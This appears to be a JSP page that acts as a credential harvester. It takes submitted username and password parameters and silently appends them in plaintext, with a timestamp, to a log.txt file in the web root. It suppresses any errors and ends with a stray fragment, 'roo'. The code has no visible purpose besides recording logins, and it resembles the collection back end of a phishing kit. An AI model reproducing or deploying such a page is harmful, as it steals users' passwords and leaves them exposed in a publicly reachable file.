<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%

try {
    String fileName = application.getRealPath("/") + "log.txt";
    String u = request.getParameter ("username");
    String p = request.getParameter ("passwd");

    FileWriter fw = new FileWriter (fileName, true);
    fw.write (String.format ("Logon: %s | %s, Date: %s\n", u, p, new Date().toString()));
    fw.close ();
} catch (Exception e) {

}

%>
roo
